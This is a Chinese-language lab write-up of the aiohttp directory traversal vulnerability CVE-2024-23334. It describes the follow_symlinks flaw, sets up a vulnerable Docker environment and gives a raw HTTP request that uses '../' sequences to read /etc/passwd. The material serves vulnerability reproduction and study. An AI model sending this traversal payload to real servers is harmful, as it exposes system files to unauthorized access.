# aiohttp 目录遍历漏洞 （CVE-2024-23334）

aiohttp 是一个基于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。

在将 aiohttp 用作 Web 服务器并配置静态路由时，必须指定静态文件的根路径。此外，可以使用 `follow_symlinks` 选项来决定是否跟随指向静态根目录之外的符号链接。当 `follow_symlinks` 设置为 `True` 时，aiohttp 不会验证所读取的文件是否位于静态根目录之内。这可能导致目录遍历漏洞，从而使攻击者可以未经授权访问系统上的任意文件，即使系统中没有实际存在符号链接。该漏洞影响的版本包括 3.9.1 及以下。

参考链接：

- [NVD - CVE-2024-23334](https://nvd.nist.gov/vuln/detail/CVE-2024-23334)

- [aiohttp 目录穿越漏洞（CVE-2024-23334 分析）](https://www.venustech.com.cn/new_type/aqldfx/20240401/27962.html)

## 环境搭建

执行如下命令启动存在漏洞的 aiothttp 3.9.1 服务器：

```
docker compose up -d
```

服务启动后，通过 `http://your-ip:8080/` 即可访问网页。

## 漏洞复现

利用此漏洞，可以构造恶意路径，从而访问服务器中任意文件。

例如，构造如下请求来查看系统文件`/etc/passwd`:

```
GET /static/../../../../../etc/passwd HTTP/1.1
Host: your-ip:8080
Content-Length: 2
```

![构造查看/etc/passwd的请求](1.png)

如果操作成功，即可以看到`/etc/passwd`的内容，证明漏洞存在。
